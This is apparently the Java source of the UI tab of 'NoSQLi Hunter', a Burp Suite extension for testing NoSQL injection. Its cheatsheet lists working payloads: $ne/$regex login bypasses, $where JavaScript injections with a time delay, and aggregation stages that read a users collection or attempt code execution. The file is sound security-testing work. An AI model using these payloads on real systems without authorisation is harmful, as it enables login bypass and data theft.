package nosqli;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;

import javax.swing.*;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.StringSelection;

/**
 * NoSQLiTab — Burp Suite UI tab, native look-and-feel.
 *
 * Deliberately uses plain Swing components with NO custom colors so the tab
 * follows Burp's own theme (dark or light), the way built-in Burp tools look.
 * Exceptions: severity text is color-coded (functional, like Burp's scanner
 * issue list) and the log/request panes are monospaced.
 *
 * Never use HTML markup in labels or dialogs — Burp renders it as literal text.
 */
public class NoSQLiTab {

    private static final int UI_FONT_SIZE  = 13;
    private static final int CODE_FONT_SIZE = 13;

    private static final Color SEVERITY_CRITICAL = new Color(204, 51, 51);
    private static final Color SEVERITY_HIGH     = new Color(204, 120, 0);
    private static final Color SEVERITY_MEDIUM   = new Color(153, 115, 0);

    private final MontoyaApi api;
    private final JPanel mainPanel;

    // Live log
    private final JTextArea logArea = new JTextArea();

    // Findings table
    private final String[] FINDING_COLS = {
        "#", "Time", "Technique", "Severity", "Parameter", "Payload", "Evidence", "URL"
    };
    private final DefaultTableModel findingsModel = new DefaultTableModel(FINDING_COLS, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };

    // Store full requests separately (parallel to table rows)
    private final java.util.List<String> fullRequests  = new java.util.ArrayList<>();
    private final java.util.List<String> fullUrlPaths  = new java.util.ArrayList<>();

    public NoSQLiTab(MontoyaApi api) {
        this.api = api;
        this.mainPanel = new JPanel(new BorderLayout(0, 0));
        buildUI();
        hookLogger();
    }

    public Component getComponent() { return mainPanel; }

    // ─────────────────────────────────────────────────────────────
    // HOOK FindingsLogger
    // ─────────────────────────────────────────────────────────────

    private void hookLogger() {
        FindingsLogger flog = FindingsLogger.getInstance();

        // Log lines → logArea
        flog.addLogListener(line -> {
            logArea.append(line);
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });

        // New finding → table row
        flog.addFindingListener(f -> {
            int rowNum = findingsModel.getRowCount() + 1;
            findingsModel.addRow(new Object[]{
                rowNum,
                f.timestamp,
                f.technique,
                f.severity,
                f.parameter,
                f.payload,
                f.evidence,
                f.url
            });
            fullRequests.add(f.fullRequest != null ? f.fullRequest : "");
            fullUrlPaths.add(f.urlPath    != null ? f.urlPath     : "");
        });
    }

    // ─────────────────────────────────────────────────────────────
    // UI BUILD
    // ─────────────────────────────────────────────────────────────

    private void buildUI() {
        mainPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));

        JTabbedPane tabs = new JTabbedPane();
        tabs.addTab("Findings",          buildFindingsPanel());
        tabs.addTab("Log",               buildLogPanel());
        tabs.addTab("Payload Cheatsheet", buildPayloadCheatsheet());
        tabs.addTab("Guide",              buildGuidePanel());

        mainPanel.add(tabs, BorderLayout.CENTER);
    }

    // ─── Findings Panel ───────────────────────────────────────────

    private JPanel buildFindingsPanel() {
        JPanel panel = new JPanel(new BorderLayout(0, 0));

        JTable table = new JTable(findingsModel);
        table.setFont(table.getFont().deriveFont(Font.PLAIN, UI_FONT_SIZE));
        table.setRowHeight(26);
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        table.setAutoCreateRowSorter(true);
        table.getColumnModel().getColumn(3).setCellRenderer(severityRenderer());

        int[] widths = {35, 70, 150, 80, 120, 220, 220, 280};
        for (int i = 0; i < widths.length; i++) {
            table.getColumnModel().getColumn(i).setPreferredWidth(widths[i]);
        }

        // Buttons row (top, toolbar style)
        JPanel btns = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 4));
        JButton btnShowReq     = plainButton("Show Full Request");
        JButton btnSendRepeater = plainButton("Send to Repeater");
        JButton btnCopyPayload = plainButton("Copy Payload");
        JButton btnCopyUrl     = plainButton("Copy URL");
        JButton btnClear       = plainButton("Clear Findings");
        JButton btnExport      = plainButton("Export Findings");

        // View-row -> model-row conversion: with a row sorter active,
        // getSelectedRow() is the VIEW index while the parallel request lists
        // are indexed by MODEL row.
        java.util.function.IntUnaryOperator toModelRow = viewRow ->
            viewRow < 0 ? -1 : table.convertRowIndexToModel(viewRow);

        btnShowReq.addActionListener(e -> {
            int row = toModelRow.applyAsInt(table.getSelectedRow());
            if (row < 0) { showInfo("Select a finding row first."); return; }
            String fullReq = row < fullRequests.size() ? fullRequests.get(row) : "N/A";
            String path    = row < fullUrlPaths.size()  ? fullUrlPaths.get(row)  : "";
            showFullRequest(
                (String) findingsModel.getValueAt(row, 2),
                (String) findingsModel.getValueAt(row, 4),
                (String) findingsModel.getValueAt(row, 5),
                fullReq, path
            );
        });

        btnSendRepeater.addActionListener(e -> {
            int row = toModelRow.applyAsInt(table.getSelectedRow());
            if (row < 0) { showInfo("Select a finding row first."); return; }
            String fullReq = row < fullRequests.size() ? fullRequests.get(row) : null;
            if (fullReq == null || fullReq.isEmpty()) { showInfo("No stored request for this finding."); return; }
            try {
                api.repeater().sendToRepeater(HttpRequest.httpRequest(fullReq), "NoSQLi Hunter");
            } catch (Exception ex) {
                showInfo("Could not send to Repeater: " + ex.getMessage());
            }
        });

        btnCopyPayload.addActionListener(e -> {
            int row = toModelRow.applyAsInt(table.getSelectedRow());
            if (row < 0) return;
            copyToClipboard((String) findingsModel.getValueAt(row, 5));
        });

        btnCopyUrl.addActionListener(e -> {
            int row = toModelRow.applyAsInt(table.getSelectedRow());
            if (row < 0) return;
            copyToClipboard((String) findingsModel.getValueAt(row, 7));
        });

        btnClear.addActionListener(e -> {
            findingsModel.setRowCount(0);
            fullRequests.clear();
            fullUrlPaths.clear();
            FindingsLogger.getInstance().clearFindings();
        });

        btnExport.addActionListener(e -> exportFindings());

        btns.add(btnShowReq);
        btns.add(btnSendRepeater);
        btns.add(btnCopyPayload);
        btns.add(btnCopyUrl);
        btns.add(btnClear);
        btns.add(btnExport);

        panel.add(btns, BorderLayout.NORTH);
        panel.add(new JScrollPane(table), BorderLayout.CENTER);

        // Double-click = show full request; right-click = copy cell
        table.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent ev) {
                if (ev.getClickCount() == 2) {
                    int row = table.convertRowIndexToModel(table.rowAtPoint(ev.getPoint()));
                    if (row >= 0) {
                        String fullReq = row < fullRequests.size() ? fullRequests.get(row) : "N/A";
                        String path    = row < fullUrlPaths.size()  ? fullUrlPaths.get(row)  : "";
                        showFullRequest(
                            (String) findingsModel.getValueAt(row, 2),
                            (String) findingsModel.getValueAt(row, 4),
                            (String) findingsModel.getValueAt(row, 5),
                            fullReq, path
                        );
                    }
                }
                if (SwingUtilities.isRightMouseButton(ev)) {
                    int row = table.rowAtPoint(ev.getPoint());
                    int col = table.columnAtPoint(ev.getPoint());
                    if (row >= 0 && col >= 0) {
                        Object val = table.getValueAt(row, col);
                        if (val != null) copyToClipboard(val.toString());
                    }
                }
            }
        });

        return panel;
    }

    /** Severity column: colored text only, everything else stays theme-native. */
    private DefaultTableCellRenderer severityRenderer() {
        return new DefaultTableCellRenderer() {
            @Override
            public Component getTableCellRendererComponent(JTable t, Object value,
                    boolean selected, boolean focused, int row, int col) {
                Component c = super.getTableCellRendererComponent(t, value, selected, focused, row, col);
                if (!selected && value != null) {
                    switch (value.toString()) {
                        case "CRITICAL" -> c.setForeground(SEVERITY_CRITICAL);
                        case "HIGH"     -> c.setForeground(SEVERITY_HIGH);
                        case "MEDIUM"   -> c.setForeground(SEVERITY_MEDIUM);
                    }
                }
                return c;
            }
        };
    }

    /** Popup window shows the full HTTP request */
    private void showFullRequest(String technique, String param, String payload,
                                  String fullRequest, String redirectPath) {
        JDialog dialog = new JDialog((Frame) null, "Full HTTP Request — " + technique + " / " + param, false);
        dialog.setSize(900, 600);
        dialog.setLocationRelativeTo(null);

        JPanel dp = new JPanel(new BorderLayout(0, 0));

        JLabel info = new JLabel(
            "Technique: " + technique + "    Parameter: " + param +
            "    Payload: " + truncate(payload, 80) +
            (redirectPath.isEmpty() ? "" : "    Redirect→ " + redirectPath)
        );
        info.setFont(info.getFont().deriveFont(Font.BOLD, UI_FONT_SIZE));
        info.setBorder(BorderFactory.createEmptyBorder(6, 10, 6, 10));
        dp.add(info, BorderLayout.NORTH);

        // Native Burp request editor (themed, syntax-highlighted); plain text
        // fallback if the stored request cannot be parsed.
        Component requestComponent;
        try {
            burp.api.montoya.ui.editor.HttpRequestEditor editor =
                api.userInterface().createHttpRequestEditor();
            editor.setRequest(HttpRequest.httpRequest(fullRequest));
            requestComponent = editor.uiComponent();
        } catch (Exception ex) {
            JTextArea reqArea = new JTextArea(fullRequest);
            reqArea.setEditable(false);
            reqArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, CODE_FONT_SIZE + 1));
            reqArea.setCaretPosition(0);
            requestComponent = new JScrollPane(reqArea);
        }
        dp.add(requestComponent, BorderLayout.CENTER);

        JPanel btnRow = new JPanel(new FlowLayout(FlowLayout.RIGHT));
        JButton copyBtn = plainButton("Copy Full Request");
        copyBtn.addActionListener(e -> copyToClipboard(fullRequest));
        JButton closeBtn = plainButton("Close");
        closeBtn.addActionListener(e -> dialog.dispose());
        btnRow.add(copyBtn);
        btnRow.add(closeBtn);
        dp.add(btnRow, BorderLayout.SOUTH);

        dialog.setContentPane(dp);
        dialog.setVisible(true);
    }

    // ─── Log Panel ────────────────────────────────────────────────

    private JPanel buildLogPanel() {
        logArea.setEditable(false);
        logArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, CODE_FONT_SIZE));
        logArea.setText("[NoSQLi Hunter] Ready — right-click any request and pick an attack, or run an active scan (Pro).\n");

        JPanel panel = new JPanel(new BorderLayout(0, 0));
        panel.add(new JScrollPane(logArea), BorderLayout.CENTER);

        JPanel logBtns = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 4));
        JButton clearLog = plainButton("Clear Log");
        clearLog.addActionListener(e -> logArea.setText(""));
        JButton copyLog = plainButton("Copy Log");
        copyLog.addActionListener(e -> copyToClipboard(logArea.getText()));
        logBtns.add(clearLog);
        logBtns.add(copyLog);
        panel.add(logBtns, BorderLayout.SOUTH);

        return panel;
    }

    // ─── Payload Cheatsheet ───────────────────────────────────────

    private JScrollPane buildPayloadCheatsheet() {
        JTabbedPane tabs = new JTabbedPane();
        tabs.setFont(tabs.getFont().deriveFont(Font.PLAIN, UI_FONT_SIZE));

        tabs.addTab("Operators",   buildTableWithCopy(
            new String[]{"Operator","URL-Encoded","JSON","Description"},
            new Object[][]{
                {"$ne",    "param[$ne]=x",       "{\"param\":{\"$ne\":\"x\"}}",       "Not equal — auth bypass"},
                {"$gt",    "param[$gt]=",         "{\"param\":{\"$gt\":\"\"}}",         "Greater than empty"},
                {"$lt",    "param[$lt]=~~~~~",    "{\"param\":{\"$lt\":\"~~~~~\"}}",    "Less than — false cond"},
                {"$gte",   "param[$gte]=",        "{\"param\":{\"$gte\":\"\"}}",        "Greater or equal"},
                {"$lte",   "param[$lte]=",        "{\"param\":{\"$lte\":\"\"}}",        "Less or equal"},
                {"$regex", "param[$regex]=.*",    "{\"param\":{\"$regex\":\".*\"}}",    "Match all — bypass"},
                {"$in",    "param[$in][]=x",      "{\"param\":{\"$in\":[\"x\"]}}",      "In array"},
                {"$nin",   "param[$nin][]=x",     "{\"param\":{\"$nin\":[\"x\"]}}",     "Not in array"},
                {"$exists","param[$exists]=true", "{\"param\":{\"$exists\":true}}",     "Field exists"},
                {"$type",  "param[$type]=2",      "{\"param\":{\"$type\":2}}",          "BSON type 2=string"},
                {"$where", "N/A",                 "{\"$where\":\"1==1\"}",              "JS expression eval"},
                {"$or",    "N/A",                 "{\"$or\":[{\"a\":1}]}",              "Logical OR"},
                {"$and",   "N/A",                 "{\"$and\":[{\"a\":1}]}",             "Logical AND"},
            }
        ));

        tabs.addTab("Auth Bypass", buildTableWithCopy(
            new String[]{"Type","Payload","Effect"},
            new Object[][]{
                {"URL-Enc","user[$ne]=x&pass[$ne]=x",                     "Bypass with $ne on both"},
                {"URL-Enc","user[$gt]=&pass[$gt]=",                       "Greater-than empty string"},
                {"URL-Enc","user[$regex]=.*&pass[$ne]=x",                  "Regex match all usernames"},
                {"URL-Enc","user[$regex]=admin.*&pass[$ne]=",              "Single admin account (multi-record-safe)"},
                {"URL-Enc","user[$in][]=admin&pass[$ne]=x",               "Try common usernames"},
                {"URL-Enc","user[$exists]=true&pass[$gt]=",               "Both fields exist"},
                {"JSON",   "{\"u\":{\"$ne\":null},\"p\":{\"$ne\":null}}",  "Null bypass"},
                {"JSON",   "{\"u\":{\"$gt\":\"\"},\"p\":{\"$gt\":\"\"}}",  "GT empty string"},
                {"JSON",   "{\"u\":{\"$regex\":\".*\"},\"p\":{\"$ne\":\"\"}}","Regex all"},
                {"JSON",   "{\"u\":{\"$regex\":\"admin.*\"},\"p\":{\"$ne\":\"\"}}","Single admin account"},
                {"JSON",   "{\"u\":\"admin\",\"p\":{\"$ne\":\"wrong\"}}",  "Known user bypass"},
                {"JSON",   "{\"$or\":[{\"$where\":\"1==1\"}]}",            "CVE-2025-23061 Mongoose"},
            }
        ));

        tabs.addTab("JS / $where", buildTableWithCopy(
            new String[]{"Context","Payload (TRUE)","Payload (FALSE)"},
            new Object[][]{
                {"URL param",  "' || '1'=='1",               "' || '1'=='2"},
                {"URL param",  "'; return true; var x='",    "'; return false; var x='"},
                {"GET param",  "' && this.x.match(/.*/)",    "' && this.x.match(/^IMPOSSIBLE$/)"},
                {"$where key", "1==1",                        "1==2"},
                {"SSJS Delay", "';var t=new Date();do{}while(new Date()-t<3000);var x='","SAFE delay 3s"},
                {"$function",  "{\"$function\":{\"body\":\"return true\",\"args\":[],\"lang\":\"js\"}}","N/A"},
            }
        ));

        tabs.addTab("Aggregation", buildTableWithCopy(
            new String[]{"Pipeline Op","JSON Payload","Effect"},
            new Object[][]{
                {"$lookup", "{\"$lookup\":{\"from\":\"users\",\"localField\":\"_id\",\"foreignField\":\"_id\",\"as\":\"leaked\"}}", "Read other collection"},
                {"$unionWith","{\"$unionWith\":{\"coll\":\"users\",\"pipeline\":[]}}",                                               "Merge users collection"},
                {"$out",    "{\"$out\":\"nosqli_test\"}",                                                                            "Write to another col"},
                {"$where",  "{\"$where\":\"global.process.mainModule.require\"}",                                                    "RCE attempt"},
            }
        ));

        return new JScrollPane(tabs);
    }

    /** Table with right-click copy on any cell */
    private JTable buildTableWithCopy(String[] cols, Object[][] data) {
        DefaultTableModel model = new DefaultTableModel(data, cols) {
            @Override public boolean isCellEditable(int r, int c) { return false; }
        };
        JTable table = new JTable(model);
        table.setFont(table.getFont().deriveFont(Font.PLAIN, UI_FONT_SIZE));
        table.setRowHeight(27);
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);

        // Right-click → copy cell
        table.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent ev) {
                int row = table.rowAtPoint(ev.getPoint());
                int col = table.columnAtPoint(ev.getPoint());
                if (row >= 0 && col >= 0) {
                    table.setRowSelectionInterval(row, row);
                    if (SwingUtilities.isRightMouseButton(ev)) {
                        Object val = table.getValueAt(row, col);
                        if (val != null) {
                            copyToClipboard(val.toString());
                            JOptionPane.showMessageDialog(table, "Copied: " + val, "Copied", JOptionPane.INFORMATION_MESSAGE);
                        }
                    }
                }
            }
        });
        return table;
    }

    // ─── Guide Panel ──────────────────────────────────────────────

    private JPanel buildGuidePanel() {
        JTextArea guide = new JTextArea();
        guide.setEditable(false);
        guide.setFont(new Font(Font.MONOSPACED, Font.PLAIN, CODE_FONT_SIZE));
        guide.setText(
            "NoSQLi Hunter — Testing Methodology\n" +
            "===================================\n\n" +
            "STEP 1: IDENTIFY BODY TYPE\n" +
            "  JSON:         application/json body\n" +
            "  URL-Encoded:  application/x-www-form-urlencoded\n" +
            "  GET Params:   query string (?user=admin)\n" +
            "  GraphQL:      JSON with 'query' field\n\n" +
            "STEP 2: ERROR DETECTION (fastest, highest confidence)\n" +
            "  Inject:  ' \" \\ ; { } $ null undefined\n" +
            "  Look for MongoError, CastError, BSONTypeError\n" +
            "  Confirmed if the error appears ONLY after injection.\n\n" +
            "STEP 3: BLIND BOOLEAN (2+ agreeing pairs required)\n" +
            "  TRUE payload  → observe response\n" +
            "  FALSE payload → compare response\n" +
            "  Detects: size diff >15%, status change, redirect path, body content.\n\n" +
            "STEP 4: AUTH DETECTION (content + path, never status alone)\n" +
            "  Baseline is re-taken with a wrong password if the captured request\n" +
            "  already logs in. 4xx/5xx responses are never a bypass; they are\n" +
            "  reported as OPERATOR-ERROR leads (the operators reached the query).\n\n" +
            "STEP 5: TIME-BASED (last resort, JS eval only)\n" +
            "  Baseline = avg(3 samples); payload delays ~3s.\n" +
            "  Confirmed if elapsed > baseline x2.5 AND a second shot confirms.\n\n" +
            "FINDINGS TABLE\n" +
            "  Double-click any row  → full HTTP request\n" +
            "  Right-click any cell  → copy value\n" +
            "  Severity colors:      CRITICAL (confirmed) / HIGH / MEDIUM (leads)\n\n" +
            "REFERENCES\n" +
            "  CVE-2025-23061  Mongoose $where bypass via $or\n" +
            "  CAPEC-676       NoSQL Injection\n" +
            "  CWE-943         Improper Neutralization\n"
        );

        JPanel p = new JPanel(new BorderLayout());
        p.add(new JScrollPane(guide), BorderLayout.CENTER);
        return p;
    }

    // ─── Utilities ────────────────────────────────────────────────

    private JButton plainButton(String text) {
        JButton b = new JButton(text);
        b.setFont(b.getFont().deriveFont(Font.PLAIN, UI_FONT_SIZE));
        return b;
    }

    private void copyToClipboard(String text) {
        if (text == null || text.isEmpty()) return;
        Toolkit.getDefaultToolkit().getSystemClipboard()
            .setContents(new StringSelection(text), null);
    }

    private void showInfo(String msg) {
        JOptionPane.showMessageDialog(mainPanel, msg, "NoSQLi Hunter", JOptionPane.INFORMATION_MESSAGE);
    }

    private void exportFindings() {
        StringBuilder sb = new StringBuilder();
        sb.append("NoSQLi Hunter — Findings Export\n");
        sb.append("Generated: ").append(java.time.LocalDateTime.now()).append("\n\n");

        for (FindingsLogger.Finding f : FindingsLogger.getInstance().getFindings()) {
            sb.append("════════════════════════════════\n");
            sb.append("Time:      ").append(f.timestamp).append("\n");
            sb.append("Technique: ").append(f.technique).append("\n");
            sb.append("Severity:  ").append(f.severity).append("\n");
            sb.append("URL:       ").append(f.url).append("\n");
            sb.append("Parameter: ").append(f.parameter).append("\n");
            sb.append("Payload:   ").append(f.payload).append("\n");
            sb.append("Evidence:  ").append(f.evidence).append("\n");
            if (f.urlPath != null && !f.urlPath.isEmpty())
                sb.append("Redirect:  ").append(f.urlPath).append("\n");
            sb.append("\n--- FULL HTTP REQUEST ---\n");
            sb.append(f.fullRequest).append("\n\n");
        }

        copyToClipboard(sb.toString());
        showInfo("Findings exported to clipboard (" +
            FindingsLogger.getInstance().getFindings().size() + " findings)");
    }

    private String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }
}
